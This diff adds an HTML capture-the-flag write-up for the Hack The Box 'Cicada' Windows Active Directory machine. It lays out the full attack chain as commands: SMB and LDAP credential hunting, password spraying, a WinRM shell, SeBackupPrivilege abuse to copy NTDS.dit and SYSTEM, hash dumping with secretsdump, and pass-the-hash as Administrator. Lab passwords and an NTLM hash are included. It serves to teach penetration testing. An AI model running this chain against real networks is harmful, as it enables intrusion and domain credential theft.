@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>Cicada - HTB | Writeup</title>
+  <meta name="description"
+    content="Cicada HTB writeup covering SMB/LDAP credential hunting, WinRM access, SeBackupPrivilege abuse, and NTDS-based domain compromise.">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+    rel="stylesheet">
+
+  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/css/main.css" rel="stylesheet">
+</head>
+
+<body>
+  <main class="main">
+    <section class="section">
+      <div class="container writeup-detail">
+        <div class="detail-box">
+          <div class="writeup-detail-header">
+            <a class="back-link top" href="../index.html#writeups">Back to Writeups</a>
+          </div>
+
+          <h1>Cicada - HTB</h1>
+          <div class="tag-list">
+            <span class="tag">Red Team</span>
+            <span class="tag">Easy</span>
+            <span class="tag">Windows</span>
+            <span class="tag">Active Directory</span>
+            <span class="tag">SMB</span>
+            <span class="tag">LDAP</span>
+            <span class="tag">Credential Hunting</span>
+            <span class="tag">WinRM</span>
+            <span class="tag">SeBackupPrivilege</span>
+            <span class="tag">VSS</span>
+            <span class="tag">NTDS Dump</span>
+            <span class="tag">Pass-the-Hash</span>
+            <span class="tag">Domain Compromise</span>
+          </div>
+
+          <h2>Overview</h2>
+          <p>
+            Cicada is an easy Active Directory box where multiple small weaknesses chain into full domain compromise.
+            The path starts with anonymous SMB access and a leaked default password, then pivots through RID-based user
+            enumeration, password spraying, LDAP description leaks, and credentials embedded in a DEV backup script.
+            Final escalation abuses <code>SeBackupPrivilege</code> as a Backup Operators user to copy
+            <code>NTDS.dit</code> and <code>SYSTEM</code> via VSS, dump domain hashes offline, and perform
+            Pass-the-Hash as <code>Administrator</code>.
+          </p>
+
+          <h2>1. Enumeration</h2>
+          <p>Initial full scan:</p>
+          <pre><code class="language-bash">nmap -sC -sV -p- -T4 -oN scans/nmap_full.txt 10.129.20.27</code></pre>
+          <p>Interesting ports confirmed a Domain Controller profile:</p>
+          <ul>
+            <li>53 DNS</li>
+            <li>88 Kerberos</li>
+            <li>389/636 LDAP</li>
+            <li>445 SMB</li>
+            <li>5985 WinRM</li>
+          </ul>
+
+          <h2>2. Anonymous SMB access (HR share)</h2>
+          <p>List shares:</p>
+          <pre><code class="language-bash">smbclient -L //10.129.20.27 -N</code></pre>
+          <p>Connect to HR:</p>
+          <pre><code class="language-bash">smbclient //10.129.20.27/HR -N</code></pre>
+          <p>List files:</p>
+          <pre><code class="language-bash">ls</code></pre>
+          <p>Download file:</p>
+          <pre><code class="language-bash">get "Notice from HR.txt"</code></pre>
+          <p>Read file locally:</p>
+          <pre><code class="language-bash">cat "Notice from HR.txt"</code></pre>
+          <p>The HR notice leaks a default password used for onboarding accounts:</p>
+          <pre><code class="language-text">Cicada$M6Corpb*@Lp#nZp!8</code></pre>
+          <figure>
+            <img src="../assets/img/Cicada/01-default-password.png" alt="Default password leaked from anonymous HR share">
+            <figcaption>Anonymous HR share discloses a default corporate password.</figcaption>
+          </figure>
+
+          <h2>3. Enumerate valid users with RID brute force</h2>
+          <pre><code class="language-bash">crackmapexec smb 10.129.20.27 -u "guest" -p "" --rid-brute</code></pre>
+          <p>This reveals valid users including:</p>
+          <ul>
+            <li>john.smoulder</li>
+            <li>sarah.dantelia</li>
+            <li>michael.wrightson</li>
+            <li>david.orelious</li>
+            <li>emily.oscars</li>
+          </ul>
+          <figure>
+            <img src="../assets/img/Cicada/02-rid-brute-smb.png" alt="RID brute-force user enumeration over SMB">
+            <figcaption>RID brute-forcing provides a reliable list of valid domain users.</figcaption>
+          </figure>
+
+          <p>Save users list:</p>
+          <pre><code class="language-bash">echo -e "john.smoulder\nsarah.dantelia\nmichael.wrightson\ndavid.orelious\nemily.oscars" &gt; users.txt</code></pre>
+
+          <h2>4. Password spraying with the HR password</h2>
+          <pre><code class="language-bash">crackmapexec smb 10.129.20.27 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'</code></pre>
+          <p>Valid credentials found:</p>
+          <pre><code class="language-text">michael.wrightson : Cicada$M6Corpb*@Lp#nZp!8</code></pre>
+          <figure>
+            <img src="../assets/img/Cicada/03-password-spray.png" alt="Password spray identifies michael.wrightson credentials">
+            <figcaption>Password spraying maps leaked default credentials to Michael's domain account.</figcaption>
+          </figure>
+
+          <h2>5. Authenticated LDAP enumeration as Michael</h2>
+          <p>Dump LDAP data with Michael's credentials:</p>
+          <pre><code class="language-bash">ldapsearch -x -H ldap://10.129.20.27 \
+-D 'michael.wrightson@cicada.htb' \
+-w 'Cicada$M6Corpb*@Lp#nZp!8' \
+-b "DC=cicada,DC=htb" &gt; scans/ldap_auth.txt</code></pre>
+          <p>Search interesting fields:</p>
+          <pre><code class="language-bash">grep -i "description" scans/ldap_auth.txt</code></pre>
+          <p>A description entry leaks another password:</p>
+          <pre><code class="language-text">aRt$Lp#7t*VQ!3</code></pre>
+          <p>Map it to a user by spraying known usernames:</p>
+          <pre><code class="language-bash">crackmapexec smb 10.129.20.27 -u users.txt -p 'aRt$Lp#7t*VQ!3' --continue-on-success</code></pre>
+          <p>Result:</p>
+          <pre><code class="language-text">david.orelious : aRt$Lp#7t*VQ!3</code></pre>
+          <figure>
+            <img src="../assets/img/Cicada/04-password-user-mapping.png" alt="Password mapped to david.orelious via spraying">
+            <figcaption>LDAP description leak is mapped to David through targeted spraying.</figcaption>
+          </figure>
+
+          <h2>6. DEV share as David</h2>
+          <p>Check readable shares:</p>
+          <pre><code class="language-bash">crackmapexec smb 10.129.20.27 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares</code></pre>
+          <p>Connect to DEV:</p>
+          <pre><code class="language-bash">smbclient //10.129.20.27/DEV -U 'cicada.htb\david.orelious%aRt$Lp#7t*VQ!3'</code></pre>
+          <p>List files:</p>
+          <pre><code class="language-bash">ls</code></pre>
+          <p>Download script:</p>
+          <pre><code class="language-bash">get Backup_script.ps1</code></pre>
+          <p>Read script:</p>
+          <pre><code class="language-bash">cat Backup_script.ps1</code></pre>
+          <p>The script contains hardcoded credentials:</p>
+          <pre><code class="language-powershell">$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force</code></pre>
+          <figure>
+            <img src="../assets/img/Cicada/05-backup-script.png" alt="Backup script leaking Emily credentials">
+            <figcaption>Credential exposure in operational scripts gives the next pivot account.</figcaption>
+          </figure>
+
+          <h2>7. WinRM shell as Emily</h2>
+          <p>Validate WinRM:</p>
+          <pre><code class="language-bash">crackmapexec winrm 10.129.20.27 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'</code></pre>
+          <p>Open shell:</p>
+          <pre><code class="language-bash">evil-winrm -i 10.129.20.27 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'</code></pre>
+          <p>Check context:</p>
+          <pre><code class="language-bash">whoami</code></pre>
+          <figure>
+            <img src="../assets/img/Cicada/06-gain-shell.png" alt="WinRM shell as emily.oscars">
+            <figcaption>WinRM access is available with Emily's recovered credentials.</figcaption>
+          </figure>
+          <figure>
+            <img src="../assets/img/Cicada/07-user-flag.png" alt="User flag retrieved as emily.oscars">
+            <figcaption>User foothold confirmed from Emily's context.</figcaption>
+          </figure>
+
+          <h2>8. Privilege escalation path (Backup Operators)</h2>
+          <p>Check group membership:</p>
+          <pre><code class="language-powershell">whoami /groups</code></pre>
+          <p>Check token privileges:</p>
+          <pre><code class="language-powershell">whoami /priv</code></pre>
+          <p>Key findings:</p>
+          <ul>
+            <li>Member of <code>BUILTIN\Backup Operators</code></li>
+            <li><code>SeBackupPrivilege</code> enabled</li>
+            <li><code>SeRestorePrivilege</code> enabled</li>
+          </ul>
+          <p>On a Domain Controller, this is ideal for extracting <code>NTDS.dit</code> and <code>SYSTEM</code>.</p>
+
+          <h2>9. Create VSS shadow copy</h2>
+          <p>Create temp workspace:</p>
+          <pre><code class="language-powershell">mkdir C:\Temp</code></pre>
+          <p>Write DiskShadow script:</p>
+          <pre><code class="language-powershell">Set-Content -Path C:\Temp\shadow.txt -Value @(
+"set context persistent nowriters",
+"add volume c: alias temp",
+"create",
+"expose %temp% z:"
+)</code></pre>
+          <p>Run DiskShadow:</p>
+          <pre><code class="language-powershell">diskshadow /s C:\Temp\shadow.txt</code></pre>
+
+          <h2>10. Copy NTDS and SYSTEM</h2>
+          <p>Copy NTDS:</p>
+          <pre><code class="language-powershell">robocopy /b Z:\Windows\NTDS C:\Temp ntds.dit</code></pre>
+          <p>Copy SYSTEM:</p>
+          <pre><code class="language-powershell">robocopy /b Z:\Windows\System32\config C:\Temp SYSTEM</code></pre>
+          <p>Download NTDS:</p>
+          <pre><code class="language-powershell">download C:\Temp\ntds.dit</code></pre>
+          <p>Download SYSTEM:</p>
+          <pre><code class="language-powershell">download C:\Temp\SYSTEM</code></pre>
+
+          <h2>11. Dump hashes offline</h2>
+          <pre><code class="language-bash">impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee hashes.txt</code></pre>
+          <p>Administrator NTLM hash obtained:</p>
+          <pre><code class="language-text">2b87e7c93a3e8a0ea4a581937016f341</code></pre>
+
+          <h2>12. Pass-the-Hash as Administrator</h2>
+          <p>Authenticate with NTLM hash:</p>
+          <pre><code class="language-bash">evil-winrm -i 10.129.20.27 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341</code></pre>
+          <p>Verify identity:</p>
+          <pre><code class="language-bash">whoami</code></pre>
+          <p>Read root flag:</p>
+          <pre><code class="language-bash">type C:\Users\Administrator\Desktop\root.txt</code></pre>
+          <figure>
+            <img src="../assets/img/Cicada/08-pwned.png" alt="Administrator access via Pass-the-Hash">
+            <figcaption>Pass-the-Hash with the Administrator NTLM completes domain compromise.</figcaption>
+          </figure>
+          <figure>
+            <img src="../assets/img/Cicada/09-root-flag.png" alt="Root flag retrieved as administrator">
+            <figcaption>Final objective achieved with administrative access.</figcaption>
+          </figure>
+
+          <h2>Credentials Discovered</h2>
+          <ul>
+            <li><strong>Default HR password:</strong> <code>Cicada$M6Corpb*@Lp#nZp!8</code></li>
+            <li><strong>michael.wrightson:</strong> <code>Cicada$M6Corpb*@Lp#nZp!8</code></li>
+            <li><strong>david.orelious:</strong> <code>aRt$Lp#7t*VQ!3</code></li>
+            <li><strong>emily.oscars:</strong> <code>Q!3@Lp#M6b*7t*Vt</code></li>
+            <li><strong>Administrator NTLM:</strong> <code>2b87e7c93a3e8a0ea4a581937016f341</code></li>
+          </ul>
+
+          <h2>Attack Chain</h2>
+          <p>
+            Anonymous HR share -> leaked default password -> RID brute users -> spray to Michael -> LDAP description
+            leak -> David credentials -> DEV script leaks Emily credentials -> WinRM as Emily -> SeBackupPrivilege
+            abuse -> dump NTDS.dit/SYSTEM -> Pass-the-Hash as Administrator.
+          </p>
+
+          <h2>Takeaways</h2>
+          <ul>
+            <li>Anonymous SMB exposure can be enough to start a full domain compromise chain.</li>
+            <li>Credential hygiene failures in LDAP descriptions and scripts are highly exploitable.</li>
+            <li>Backup privileges on a DC are equivalent to high-risk secrets exposure.</li>
+          </ul>
+
+          <a class="back-link bottom" href="../index.html#writeups">Back to Writeups</a>
+        </div>
+      </div>
+    </section>
+  </main>
+  <script src="../assets/js/main.js" defer></script>
+</body>
+
+</html>
